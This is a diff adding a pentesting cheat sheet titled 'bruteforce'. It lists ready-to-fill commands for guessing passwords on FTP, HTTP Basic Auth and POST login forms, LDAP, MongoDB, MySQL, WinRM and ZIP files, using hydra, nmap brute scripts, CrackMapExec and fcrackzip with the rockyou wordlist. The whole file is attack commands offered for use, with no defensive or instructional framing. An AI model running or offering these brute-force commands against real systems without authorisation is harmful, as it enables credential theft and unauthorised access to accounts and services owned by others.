@@ -1,0 +1,25 @@
+% bruteforce
+
+# FTP Bruteforce
+hydra -l <USERNAME> -P <PASSWORDLIST> -t 32 <IP> ftp
+
+# HTTP Basic Auth Bruteforce
+hydra -L <USERNAMELIST> -P <PASSWORDLIST> <IP> http-get <PATH>
+
+# HTTP POST Bruteforce
+hydra -L <USERNAMELIST> -P <PASSWORDLIST> <IP> http-post-form "<PATH>:username=^USER^&password=^PASS^&enter=Sign+in:<INCORRECT_MSG>" -V -v
+
+# LDAP Bruteforce
+sudo nmap --script ldap-brute -p 389 <IP>
+
+# MongodDB Bruteforce
+sudo nmap -sV --script mongodb-brute -n -p 27017 <IP>
+
+# MYSQL Bruteforce
+hydra -L <USERNAMELIST> -P <PASSLIST> <IP> mysql
+
+# WinRM bruteforce
+cme winrm <IP> -d <DOMAIN> -u <USERNAMELIST> -p <PASSWORDLIST>
+
+# ZIP Bruteforce
+fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' <ZIPFILE>
